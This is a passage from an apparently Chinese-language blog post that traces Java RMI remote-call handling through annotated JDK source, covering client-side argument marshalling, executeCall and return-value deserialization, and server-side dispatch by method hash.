class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程对象的 invoke 方法，传递代理对象、方法、参数和方法的哈希值</span></span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                          getMethodHash(method));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnicastRef#invoke</code> 函数的逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用远程方法。此方法通过委托调用的方式，允许引用处理连接到远程主机、对方法及其参数进行序列化，</span></span><br><span class="line"><span class="comment"> * 然后将方法调用发送到远程主机。</span></span><br><span class="line"><span class="comment"> * 该方法返回远程主机上远程对象方法调用的结果，或者如果调用失败则抛出 `RemoteException`，</span></span><br><span class="line"><span class="comment"> * 或者如果远程调用抛出异常，则抛出应用程序级别的异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 远程对象的代理</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method 要调用的方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> params 参数列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> opnum 一个哈希值，用于表示方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程方法调用的结果</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 远程方法调用时抛出的异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj,</span></span><br><span class="line"><span class="params">                     Method method,</span></span><br><span class="line"><span class="params">                     Object[] params,</span></span><br><span class="line"><span class="params">                     <span class="type">long</span> opnum)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取连接</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">reuse</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果调用连接是 &quot;reused&quot; 的，记得不要再重用 */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">alreadyFreed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建调用上下文</span></span><br><span class="line">        call = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), -<span class="number">1</span>, opnum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化参数</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            marshalCustomCallData(out);  <span class="comment">// 序列化自定义调用数据</span></span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                marshalValue(types[i], params[i], out);  <span class="comment">// 序列化每个参数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行远程方法调用</span></span><br><span class="line">        call.executeCall();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取方法的返回类型</span></span><br><span class="line">            Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">            <span class="keyword">if</span> (rtype == <span class="keyword">void</span>.class)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;  <span class="comment">// 如果返回类型是 void，返回 null</span></span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解序列化返回值</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> unmarshalValue(rtype, in);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> returnValue;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>UnicastRef</code> 的 <code>LiveRef</code> 属性包含 <code>Endpoint</code>、<code>Channel</code> 封装和与网络通信有关的方法，其中包含服务端该 <code>stub</code> 对应的监听端口，因此我们可以通过 <code>ref.getChannel().newConnection()</code> 建立与服务端的连接并得到链接对象 <code>conn</code>。</p>
<p>之后利用这个链接对象 <code>conn</code> 创建一个 <code>StreamRemoteCall</code> 对象并传入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), -<span class="number">1</span>, opnum);</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>conn</code>：网络连接相关。</li>
<li><code>ref.getObjID()</code>：用来表示远程对象。</li>
<li><code>op</code>：传递一个负数（-1），让被调用方通过方法哈希来确定被调用的方法。</li>
<li><code>opnum</code>：前面 <code>getMethodHash(method)</code> 计算得到的被调用方法的哈希。</li>
</ul>
<p>之后若方法有参数，则调用 <code>marshalValue</code> 将参数序列化，并写入输出流。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">    marshalValue(types[i], params[i], out);  <span class="comment">// 序列化每个参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>marshalValue</code> 会对 <code>Object</code> 类型的参数进行序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 RMI 的序列化格式将值序列化到 ObjectOutput 输出流，</span></span><br><span class="line"><span class="comment"> * 适用于参数或返回值的序列化。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">marshalValue</span><span class="params">(Class&lt;?&gt; type, Object value,</span></span><br><span class="line"><span class="params">                                   ObjectOutput out)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果是原始类型</span></span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            out.writeInt(((Integer) value).intValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            out.writeBoolean(((Boolean) value).booleanValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            out.writeByte(((Byte) value).byteValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            out.writeChar(((Character) value).charValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            out.writeShort(((Short) value).shortValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            out.writeLong(((Long) value).longValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            out.writeFloat(((Float) value).floatValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            out.writeDouble(((Double) value).doubleValue());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果遇到不认识的原始类型，抛出错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果是对象类型，使用 writeObject 序列化对象</span></span><br><span class="line">        out.writeObject(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后 <code>call.executeCall</code> 执行远程方法调用，该函数主要逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行调用所需的所有操作。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;fallthrough&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span> returnType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取结果头部</span></span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">ackHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 如果输出流不为空，获取 DGC 确认处理器</span></span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler = out.getDGCAckHandler();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 释放输出流</span></span><br><span class="line">        releaseOutputStream();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取输入流</span></span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 读取操作码</span></span><br><span class="line">        <span class="type">byte</span> <span class="variable">op</span> <span class="operator">=</span> rd.readByte();</span><br><span class="line">        <span class="keyword">if</span> (op != TransportConstants.Return) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取输入流并读取返回类型</span></span><br><span class="line">        getInputStream();</span><br><span class="line">        returnType = in.readByte();</span><br><span class="line">        in.readID();        <span class="comment">// 读取 DGC 确认的 ID</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnmarshalException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理返回值</span></span><br><span class="line">    <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">        <span class="keyword">break</span>;  <span class="comment">// 正常返回，不做任何处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        <span class="comment">// 如果是异常返回，读取异常对象并抛出</span></span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            discardPendingRefs();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们主要关心的部分为：</p>
<ol>
<li><p>首先 <code>executeCall</code> 会调用 <code>releaseOutputStream</code> 释放输出流，即发送数据给服务端。</p>
</li>
<li><p><code>getInputStream</code> 读取返回的数据，写到 <code>in</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取存根/骨架应该从中获取结果/参数的输入流。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ObjectInput <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 如果输入流为空，则创建新的输入流</span></span><br><span class="line">    <span class="keyword">if</span> (in == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="comment">// 创建新的 ConnectionInputStream 以包装原始输入流</span></span><br><span class="line">        in = <span class="keyword">new</span> <span class="title class_">ConnectionInputStream</span>(conn.getInputStream());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回输入流</span></span><br><span class="line">    <span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>从 <code>in</code> 中读取返回类型 <code>returnType</code>。</p>
<ul>
<li><p>如果是异常返回，直接进行反序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">    <span class="comment">// 如果是异常返回，读取异常对象并抛出</span></span><br><span class="line">    Object ex;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ex = in.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        discardPendingRefs();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果是正常返回则直接从 <code>executeCall</code> 返回到 <code>invoke</code> 函数。在 <code>invoke</code> 函数中会调用 <code>unmarshalValue</code> 函数对返回结果进行反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 RMI 的序列化格式从 ObjectInput 源中反序列化值，</span></span><br><span class="line"><span class="comment"> * 适用于参数或返回值的反序列化。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果是原始类型</span></span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="comment">// 根据不同的原始类型进行反序列化</span></span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Double.valueOf(in.readDouble());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果遇到无法识别的原始类型，抛出错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 如果类型是 String 且输入流是 ObjectInputStream 实例</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (type == String.class &amp;&amp; in <span class="keyword">instanceof</span> ObjectInputStream) &#123;</span><br><span class="line">        <span class="comment">// 使用 RMI 序列化格式读取字符串</span></span><br><span class="line">        <span class="keyword">return</span> SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream) in);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则，对返回结果反序列化</span></span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取方法的返回类型</span></span><br><span class="line">Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line"><span class="keyword">if</span> (rtype == <span class="keyword">void</span>.class)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;  <span class="comment">// 如果返回类型是 void，返回 null</span></span><br><span class="line"><span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解序列化返回值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> unmarshalValue(rtype, in);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ol>
<h4 id="服务端部分"><a href="#服务端部分" class="headerlink" title="服务端部分"></a>服务端部分</h4><p>与前面的服务发现过程中的注册中心部分一样，客户端进行远程调用时服务端同样会执行到 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code> 进而调用到 <code>UnicastServerRef#dispatch</code>。</p>
<p>只不过这次在 <code>UnicastServerRef#dispatch</code> 中不会调用 <code>oldDispatch</code> 函数而是继续往下执行。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ObjectInput in;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    in = call.getInputStream();</span><br><span class="line">    num = in.readInt();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>,</span><br><span class="line">                                 readEx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 远程对象的 skel 为 null，因此不会调用 oldDispatch。</span></span><br><span class="line"><span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// If there is a skeleton, use it</span></span><br><span class="line">        oldDispatch(obj, call, num);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt;= <span class="number">0</span>)&#123; <span class="comment">// 因为远程过程调用以方法哈希为准，因此 num 为 -1。</span></span><br><span class="line">    <span class="comment">// 因为 num &gt;= 0 是调用注册中心方法的情况，而注册中心对应的 skel 不为空会走前面的 oldDispatch，因此这里会抛出异常。</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">            <span class="string">&quot;skeleton class not found but required for client version&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    op = in.readLong(); <span class="comment">// 读取方法的哈希</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>,</span><br><span class="line">            readEx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先根据哈希从哈希表中找到对应的方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从哈希表中获取方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> hashToMethod_Map.get(op);</span><br><span class="line"><span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;unrecognized method hash: &quot;</span> +</span><br><span class="line">        <span class="string">&quot;method not supported by remote object&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>unmarshalParametersChecked</code> 函数对参数进行反序列化。</p>
